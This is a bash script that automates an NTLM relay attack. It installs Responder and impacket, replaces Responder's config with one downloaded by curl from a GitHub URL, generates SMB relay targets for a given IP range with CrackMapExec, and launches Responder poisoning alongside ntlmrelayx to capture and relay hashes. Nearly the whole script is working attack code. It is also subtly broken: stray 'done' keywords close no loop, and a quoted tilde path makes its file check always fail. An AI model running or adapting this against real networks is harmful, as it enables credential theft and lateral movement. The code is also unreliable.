#!/bin/bash

# some quick colors
RED="\033[1;31m"
BLUE="\033[1;34m"
BLUE2="\033[0;34m"
RESET="\033[0m"
BOLD="\e[1m"

#Options
while getopts 'r:h' opt; do
  case "$opt" in
    r)
      range="$OPTARG"
      echo -e "[${BLUE}+${RESET}] IP Range is set to '$range'"
      ;;

    h)
      echo -e "[${RED}!${RESET}] Usage: $(basename $0) -r 10.10.10.0/24"
      echo -e "              -h:  print this help dialog"
      echo -e "              -r:  specify IP Range (Required)"
      exit 0
      ;;

    :)
      echo -e "[${RED}!${RESET}] Option requires an argument.\n\n    For usage, use $(basename $0) -h"
      exit 1
      ;;

    ?)
      echo -e "[${RED}!${RESET}] For usage, use $(basename $0) -h"
      exit 1
      ;;
  esac
done

#Installing dependencies if not already installed
echo "[${BLUE}+${RESET}] Checking for application dependencies."
if command -v terminator &> /dev/null
then
    echo -e "[${BLUE}+${RESET}] Terminator is installed."
else
echo -e "[${RED}!${RESET}] Installing Terminator."
sudo apt update && sudo apt install terminator -y
fi
if command -v responder &> /dev/null
then
    echo -e "[${BLUE}+${RESET}] Responder is installed."
else
echo -e "[${RED}!${RESET}] Installing Responder."
sudo apt update && sudo apt install responder -y
fi
if command -v impacket-ntlmrelayx &> /dev/null
then
    echo -e "[${BLUE}+${RESET}] Impacket-Scripts is installed."
else
echo -e "[${RED}!${RESET}] Installing Impacket-Scrpits."
sudo apt update && sudo apt install impacket-scripts -y
fi
done

#Removing original Responder Config File
echo -e "[${BLUE}+${RESET}] Removing default Responder config file."
sudo rm -rf /usr/share/responder/Responder.conf

#Downloading Modified Responder Config File
echo -e "[${BLUE}+${RESET}] Downloading modified Responder config file"
sudo curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/ntlmrelayx_responder.conf -o /usr/share/responder/Responder.conf

#Sleep to allow for removal and downloading to complete.
sleep 5

#Running CrackMapExec to create a relay list
echo -e "[${BLUE}+${RESET}] Generating relay list for the ${range} IP range."
crackmapexec smb ${range} --gen-relay-list ~/relay_targets.txt

#Launching Responder and impacket-ntlmrelayx
echo -e "[${BLUE}+ ${RESET}] Checking for relay list."
if [ ! -f "~/relay_targets.txt" ]; then
    echo "Relay file does not exist. Sorry about your luck..."
else
    terminator -e "sudo responder -I eth0 -w"
    terminator -e "impacket-ntlmrelayx -tf ~/relay_targets.txt -smb2support -socks --output-file ~/ntlmrelayx_hashes.out"
fi
done
exit
